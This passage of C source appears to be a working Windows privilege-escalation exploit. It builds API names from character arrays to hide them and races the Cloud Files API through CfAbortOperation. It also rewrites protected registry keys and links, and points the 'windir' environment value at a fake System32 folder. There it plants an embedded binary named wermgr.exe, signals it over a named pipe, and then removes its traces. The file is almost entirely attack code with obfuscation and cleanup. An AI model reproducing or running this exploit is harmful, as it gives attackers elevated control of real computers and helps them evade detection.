  _fnCH(hTCK);
  _fnCH(hTFT);

  MODNAME_CFAPI;
  PVOID hCF = GET_MODULE_CFAPI;
  if (!hCF) {
    _fnVF(kp, 0, MEM_RELEASE);
    _fnVF(fp, 0, MEM_RELEASE);
    _fnVF((void *)pD, 0, MEM_RELEASE);
    return;
  }
  typedef HRESULT(WINAPI * pCAO)(DWORD, PVOID, int);
  pCAO CfAbortOperation;
  {
    char _f[] = {'C', 'f', 'A', 'b', 'o', 'r', 't', 'O', 'p',
                 'e', 'r', 'a', 't', 'i', 'o', 'n', '\0'};
    *(PVOID *)&CfAbortOperation = _GetProcAddress(hCF, _f);
    if (!CfAbortOperation) {
      _fnVF(kp, 0, MEM_RELEASE);
      _fnVF(fp, 0, MEM_RELEASE);
      _fnVF((void *)pD, 0, MEM_RELEASE);
      return;
    }
  }

  while (!*pD)
    CfAbortOperation(_fnGCPI(), NULL, AbortHydrationFlagsBlock);

  _fnVF(kp, 0, MEM_RELEASE);
  _fnVF(fp, 0, MEM_RELEASE);
  _fnVF((void *)pD, 0, MEM_RELEASE);
}

FUNC DWORD WINAPI Stage1Thread(LPVOID lp) {
  Stage1((BOOL)(SIZE_T)lp);
  return 0;
}

FUNC void Stage2(void) {
  WCHAR cFK[] = {L'\\', L'R', L'e', L'g', L'i', L's',  L't',  L'r', L'y',
                 L'\\', L'U', L's', L'e', L'r', L'\\', L'.',  L'D', L'E',
                 L'F',  L'A', L'U', L'L', L'T', L'\\', L'S',  L'o', L'f',
                 L't',  L'w', L'a', L'r', L'e', L'\\', L'P',  L'o', L'l',
                 L'i',  L'c', L'i', L'e', L's', L'\\', L'M',  L'i', L'c',
                 L'r',  L'o', L's', L'o', L'f', L't',  L'\\', L'C', L'l',
                 L'o',  L'u', L'd', L'F', L'i', L'l',  L'e',  L's', L'\0'};
  WCHAR bAK[] = {
      L'\\', L'R',  L'e', L'g',  L'i', L's', L't', L'r',  L'y',  L'\\', L'U',
      L's',  L'e',  L'r', L'\\', L'.', L'D', L'E', L'F',  L'A',  L'U',  L'L',
      L'T',  L'\\', L'S', L'o',  L'f', L't', L'w', L'a',  L'r',  L'e',  L'\\',
      L'P',  L'o',  L'l', L'i',  L'c', L'i', L'e', L's',  L'\\', L'M',  L'i',
      L'c',  L'r',  L'o', L's',  L'o', L'f', L't', L'\\', L'C',  L'l',  L'o',
      L'u',  L'd',  L'F', L'i',  L'l', L'e', L's', L'\\', L'B',  L'l',  L'o',
      L'c',  L'k',  L'e', L'd',  L'A', L'p', L'p', L's',  L'\0'};
  WCHAR tKK[] = {L'\\', L'R', L'e', L'g', L'i', L's',  L't', L'r', L'y',
                 L'\\', L'U', L's', L'e', L'r', L'\\', L'.', L'D', L'E',
                 L'F',  L'A', L'U', L'L', L'T', L'\\', L'V', L'o', L'l',
                 L'a',  L't', L'i', L'l', L'e', L' ',  L'E', L'n', L'v',
                 L'i',  L'r', L'o', L'n', L'm', L'e',  L'n', L't', L'\0'};

  HANDLE hCF =
      OpenKey(NULL, cFK, WRITE_DAC | WRITE_OWNER | KEY_ENUMERATE_SUB_KEYS);
  if (hCF) {
    SetSecurityDescriptor(hCF, 4 | 0x10);
    DeleteRegistryTree(hCF);
    {
      MODNAME_K32;
      PVOID _hk32 = GET_MODULE_K32;
      if (_hk32) {
        typedef BOOL(WINAPI * pCH)(HANDLE);
        pCH _fnCH;
        {
          char _f[] = {'C', 'l', 'o', 's', 'e', 'H',
                       'a', 'n', 'd', 'l', 'e', '\0'};
          *(PVOID *)&_fnCH = _GetProcAddress(_hk32, _f);
          if (_fnCH)
            _fnCH(hCF);
        }
      }
    }
  }
  CreateRegistrySymbolicLink(bAK, tKK);
  Stage1(FALSE);
}

FUNC void Stage3(void) {
  int _fail = 0;
  (void)_fail;
  MODNAME_NTDLL;
  PVOID hN = GET_MODULE_NTDLL;
  if (!hN)
    return;
  MODNAME_K32;
  PVOID hK = GET_MODULE_K32;
  if (!hK)
    return;
  MODNAME_A32;
  PVOID hA = GET_MODULE_A32;
  if (!hA)
    return;

  typedef NTSTATUS(NTAPI * pNDK)(HANDLE);
  pNDK NtDeleteKey;
  {
    char _f[] = {'N', 't', 'D', 'e', 'l', 'e', 't', 'e', 'K', 'e', 'y', '\0'};
    *(PVOID *)&NtDeleteKey = _GetProcAddress(hN, _f);
    if (!NtDeleteKey)
      return;
  }
  typedef NTSTATUS(NTAPI * pNSVK)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID,
                                  ULONG);
  pNSVK NtSetValueKey;
  {
    char _f[] = {'N', 't', 'S', 'e', 't', 'V', 'a',
                 'l', 'u', 'e', 'K', 'e', 'y', '\0'};
    *(PVOID *)&NtSetValueKey = _GetProcAddress(hN, _f);
    if (!NtSetValueKey)
      return;
  }

  typedef PVOID(WINAPI * pVA)(LPVOID, SIZE_T, DWORD, DWORD);
  typedef BOOL(WINAPI * pVF)(LPVOID, SIZE_T, DWORD);
  typedef BOOL(WINAPI * pCH)(HANDLE);
  pVA _fnVA;
  {
    char _f[] = {'V', 'i', 'r', 't', 'u', 'a', 'l',
                 'A', 'l', 'l', 'o', 'c', '\0'};
    *(PVOID *)&_fnVA = _GetProcAddress(hK, _f);
    if (!_fnVA)
      return;
  }
  pVF _fnVF;
  {
    char _f[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', '\0'};
    *(PVOID *)&_fnVF = _GetProcAddress(hK, _f);
    if (!_fnVF)
      return;
  }
  pCH _fnCH;
  {
    char _f[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
    *(PVOID *)&_fnCH = _GetProcAddress(hK, _f);
    if (!_fnCH)
      return;
  }

  typedef BOOL(WINAPI * pSEVW)(LPCWSTR, LPCWSTR);
  pSEVW SetEnvironmentVariableW;
  {
    char _f[] = {'S', 'e', 't', 'E', 'n', 'v', 'i', 'r', 'o', 'n', 'm', 'e',
                 'n', 't', 'V', 'a', 'r', 'i', 'a', 'b', 'l', 'e', 'W', '\0'};
    *(PVOID *)&SetEnvironmentVariableW = _GetProcAddress(hK, _f);
    if (!SetEnvironmentVariableW)
      return;
  }

  typedef HANDLE(WINAPI * pCNPW)(LPCWSTR, DWORD, DWORD, DWORD, DWORD, DWORD,
                                 DWORD, LPSECURITY_ATTRIBUTES);
  pCNPW _fnCNPW;
  {
    char _f[] = {'C', 'r', 'e', 'a', 't', 'e', 'N', 'a', 'm',
                 'e', 'd', 'P', 'i', 'p', 'e', 'W', '\0'};
    *(PVOID *)&_fnCNPW = _GetProcAddress(hK, _f);
    if (!_fnCNPW)
      return;
  }

  typedef BOOL(WINAPI * pConNP)(HANDLE, LPOVERLAPPED);
  pConNP _fnConNP;
  {
    char _f[] = {'C', 'o', 'n', 'n', 'e', 'c', 't', 'N', 'a',
                 'm', 'e', 'd', 'P', 'i', 'p', 'e', '\0'};
    *(PVOID *)&_fnConNP = _GetProcAddress(hK, _f);
    if (!_fnConNP)
      return;
  }

  typedef BOOL(WINAPI * pRF)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
  pRF _fnRF;
  {
    char _f[] = {'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', '\0'};
    *(PVOID *)&_fnRF = _GetProcAddress(hK, _f);
    if (!_fnRF)
      return;
  }

  typedef HANDLE(WINAPI * pCFW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
                                DWORD, DWORD, HANDLE);
  pCFW _fnCFW;
  {
    char _f[] = {'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', '\0'};
    *(PVOID *)&_fnCFW = _GetProcAddress(hK, _f);
    if (!_fnCFW)
      return;
  }

  typedef BOOL(WINAPI * pWF)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
  pWF _fnWF;
  {
    char _f[] = {'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', '\0'};
    *(PVOID *)&_fnWF = _GetProcAddress(hK, _f);
    if (!_fnWF)
      return;
  }

  typedef BOOL(WINAPI * pRDW)(LPCWSTR);
  pRDW _fnRDW;
  {
    char _f[] = {'R', 'e', 'm', 'o', 'v', 'e', 'D', 'i', 'r',
                 'e', 'c', 't', 'o', 'r', 'y', 'W', '\0'};
    *(PVOID *)&_fnRDW = _GetProcAddress(hK, _f);
    if (!_fnRDW)
      return;
  }

  typedef BOOL(WINAPI * pCDW)(LPCWSTR, LPSECURITY_ATTRIBUTES);
  pCDW _fnCDW;
  {
    char _f[] = {'C', 'r', 'e', 'a', 't', 'e', 'D', 'i', 'r',
                 'e', 'c', 't', 'o', 'r', 'y', 'W', '\0'};
    *(PVOID *)&_fnCDW = _GetProcAddress(hK, _f);
    if (!_fnCDW)
      return;
  }

  typedef DWORD(WINAPI * pGLE)(void);
  pGLE _fnGLE;
  {
    char _f[] = {'G', 'e', 't', 'L', 'a', 's', 't',
                 'E', 'r', 'r', 'o', 'r', '\0'};
    *(PVOID *)&_fnGLE = _GetProcAddress(hK, _f);
    if (!_fnGLE)
      return;
  }

  typedef VOID(WINAPI * pSlp)(DWORD);
  pSlp _fnSlp;
  {
    char _f[] = {'S', 'l', 'e', 'e', 'p', '\0'};
    *(PVOID *)&_fnSlp = _GetProcAddress(hK, _f);
    if (!_fnSlp)
      return;
  }

  WCHAR bAK[] = {
      L'\\', L'R',  L'e', L'g',  L'i', L's', L't', L'r',  L'y',  L'\\', L'U',
      L's',  L'e',  L'r', L'\\', L'.', L'D', L'E', L'F',  L'A',  L'U',  L'L',
      L'T',  L'\\', L'S', L'o',  L'f', L't', L'w', L'a',  L'r',  L'e',  L'\\',
      L'P',  L'o',  L'l', L'i',  L'c', L'i', L'e', L's',  L'\\', L'M',  L'i',
      L'c',  L'r',  L'o', L's',  L'o', L'f', L't', L'\\', L'C',  L'l',  L'o',
      L'u',  L'd',  L'F', L'i',  L'l', L'e', L's', L'\\', L'B',  L'l',  L'o',
      L'c',  L'k',  L'e', L'd',  L'A', L'p', L'p', L's',  L'\0'};
  HANDLE hBadKey = OpenKey(NULL, bAK, DELETE);
  if (hBadKey) {
    NtDeleteKey(hBadKey);
    _fnCH(hBadKey);
  }

  WCHAR tKK[] = {L'\\', L'R', L'e', L'g', L'i', L's',  L't', L'r', L'y',
                 L'\\', L'U', L's', L'e', L'r', L'\\', L'.', L'D', L'E',
                 L'F',  L'A', L'U', L'L', L'T', L'\\', L'V', L'o', L'l',
                 L'a',  L't', L'i', L'l', L'e', L' ',  L'E', L'n', L'v',
                 L'i',  L'r', L'o', L'n', L'm', L'e',  L'n', L't', L'\0'};
  HANDLE hVE = OpenKey(NULL, tKK, WRITE_DAC | WRITE_OWNER);
  if (hVE) {
    SetSecurityDescriptor(hVE, 4);
    _fnCH(hVE);
  }
  HANDLE hVEEnum = OpenKey(NULL, tKK, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE);
  if (hVEEnum) {
    typedef NTSTATUS(NTAPI * pNEK)(HANDLE, ULONG, int, PVOID, ULONG, PULONG);
    pNEK NtEnumerateKey;
    {
      char _f[] = {'N', 't', 'E', 'n', 'u', 'm', 'e', 'r',
                   'a', 't', 'e', 'K', 'e', 'y', '\0'};
      *(PVOID *)&NtEnumerateKey = _GetProcAddress(hN, _f);
      if (!NtEnumerateKey)
        return;
    }
    ULONG idx = 0;
    WCHAR sn[260];
    while (1) {
      ULONG buf[1024];
      ALIGN_STACK();
      NTSTATUS st = NtEnumerateKey(hVEEnum, idx, 0, buf, sizeof(buf), NULL);
      if (st == STATUS_NO_MORE_ENTRIES)
        break;
      if (NT_SUCCESS(st)) {
        PKEY_BASIC_INFORMATION pki = (PKEY_BASIC_INFORMATION)buf;
        ULONG tc = pki->NameLength / sizeof(WCHAR);
        if (tc >= 260)
          tc = 259;
        _wcsncpy(sn, pki->Name, tc);
        sn[tc] = L'\0';
        WCHAR fp[520];
        _wcscpy(fp, tKK);
        _wcscat(fp, L"\\");
        _wcscat(fp, sn);
        HANDLE hSK = OpenKey(NULL, fp, WRITE_DAC);
        if (hSK) {
          SetSecurityDescriptor(hSK, 4);
          _fnCH(hSK);
        }
        hSK = OpenKey(NULL, fp, DELETE);
        if (hSK) {
          NtDeleteKey(hSK);
          _fnCH(hSK);
        }
        idx = 0;
      } else
        break;
    }
    _fnCH(hVEEnum);
  }

  WCHAR wn[] = {L'w', L'i', L'n', L'd', L'i', L'r', L'\0'};
  UNICODE_STRING uvn;
  RtlInitUnicodeString(&uvn, wn);

  WCHAR cd[] = {L'C', L':', L'\\', L'P', 'r', L'o', L'g', L'r',
                L'a', L'm', L'D',  'a',  't', 'a',  '\0'};
  UNICODE_STRING ucd;
  RtlInitUnicodeString(&ucd, cd);

  WCHAR mpv1[] = {L'm', L'p', L'_', L'p', L'i', L'p', L'e', L'\0'};
  UNICODE_STRING ump;
  RtlInitUnicodeString(&ump, mpv1);

  WCHAR mpv2[] = {L'm', L'p', L'_', L'p', L'a', L'y', L'l', L'o',
                  L'a', L'd', L'\0'};
  UNICODE_STRING uml;
  RtlInitUnicodeString(&uml, mpv2);

  WCHAR defPl[] = {L'C', L':', L'\\', L'W', L'i', L'n', L'd', L'o', L'w',
                   L's', L'\\', L'S', L'y', L's', L't', L'e', L'm', L'3',
                   L'2', L'\\', L'c', L'o', L'n', L'h', L'o', L's', L't',
                   L'.', L'e', L'x', L'e', L'\0'};

  WCHAR pipeName[] = {L'\\', L'\\', L'.', L'\\', L'p', L'i', L'p', L'e',
                      L'\\', L'm',  L'p', L'_',  L'r', L'u', L'n', L'\0'};

  HANDLE hTV = OpenKey(NULL, tKK, KEY_SET_VALUE);
  if (hTV) {
    ALIGN_STACK();
    NtSetValueKey(hTV, (PUNICODE_STRING)&uvn, 0, REG_SZ, (PVOID)cd,
                  (ULONG)(_wcslen(cd) + 1) * sizeof(WCHAR));
    ALIGN_STACK();
    NtSetValueKey(hTV, (PUNICODE_STRING)&ump, 0, REG_SZ, (PVOID)pipeName,
                  (ULONG)(_wcslen(pipeName) + 1) * sizeof(WCHAR));
    ALIGN_STACK();
    NtSetValueKey(hTV, (PUNICODE_STRING)&uml, 0, REG_SZ, (PVOID)defPl,
                  (ULONG)(_wcslen(defPl) + 1) * sizeof(WCHAR));
    _fnCH(hTV);
  }

  WCHAR sys32Path[280];
  _wcscpy(sys32Path, cd);
  _wcscat(sys32Path, L"\\System32");
  _fnCDW(sys32Path, NULL);

  WCHAR werPath[320];
  _wcscpy(werPath, sys32Path);
  _wcscat(werPath, L"\\wermgr.exe");
  HANDLE hWF = _fnCFW(werPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                      FILE_ATTRIBUTE_NORMAL, NULL);
  if (hWF != INVALID_HANDLE_VALUE) {
    DWORD written;
    ALIGN_STACK();
    _fnWF(hWF, runner_pe_data, sizeof(runner_pe_data), &written, NULL);
    _fnCH(hWF);
  }

  HANDLE hPipe = _fnCNPW(pipeName, PIPE_ACCESS_DUPLEX,
                         PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                         1, 0, 0, NMPWAIT_USE_DEFAULT_WAIT, NULL);
  if (hPipe == INVALID_HANDLE_VALUE)
    return;

  BOOL bConnected = _fnConNP(hPipe, NULL);
  if (!bConnected && _fnGLE() != ERROR_PIPE_CONNECTED) {
    _fnCH(hPipe);
    return;
  }

  ExecuteTask();

  BYTE ib[1];
  DWORD br;
  _fnRF(hPipe, ib, sizeof(ib), &br, NULL);
  _fnCH(hPipe);
  _fnSlp(1000);

  _fnRDW(sys32Path);
  _fnRDW(cd);

  HANDLE hTKD = OpenKey(NULL, tKK, DELETE);
  if (hTKD) {
    DeleteRegistryTree(hTKD);
    _fnCH(hTKD);
  }
}

FUNC void start(void) {
  MODNAME_CFAPI;
  PVOID hCF = GET_MODULE_CFAPI;
  if (!hCF)
    return;

  MODNAME_K32;
  PVOID hK = GET_MODULE_K32;
  if (!hK)
    return;
  typedef HANDLE(WINAPI * pCT)(LPSECURITY_ATTRIBUTES, SIZE_T,
                               LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
  typedef DWORD(WINAPI * pWSO)(HANDLE, DWORD);
  typedef BOOL(WINAPI * pCH)(HANDLE);
  pCT _fnCT;
  {
    char _f[] = {'C', 'r', 'e', 'a', 't', 'e', 'T',
                 'h', 'r', 'e', 'a', 'd', '\0'};
    *(PVOID *)&_fnCT = _GetProcAddress(hK, _f);
    if (!_fnCT)
      return;
  }
  pWSO _fnWSO;
  {
    char _f[] = {'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n',
                 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', '\0'};
    *(PVOID *)&_fnWSO = _GetProcAddress(hK, _f);
    if (!_fnWSO)
      return;
  }
  pCH _fnCH;
  {
    char _f[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
    *(PVOID *)&_fnCH = _GetProcAddress(hK, _f);
    if (!_fnCH)
      return;
  }

  HANDLE hT1 = _fnCT(NULL, 0, Stage1Thread, (LPVOID)(SIZE_T)TRUE, 0, NULL);
  if (hT1) {
    _fnWSO(hT1, 15000);
    _fnCH(hT1);
  }

  HANDLE hT2 = _fnCT(NULL, 0, Stage2Thread, NULL, 0, NULL);
  if (hT2) {
    _fnWSO(hT2, 15000);
    _fnCH(hT2);
  }

  Stage3();
}

FUNC DWORD WINAPI Stage2Thread(LPVOID lp) {
  (void)lp;
  Stage2();
  return 0;
}
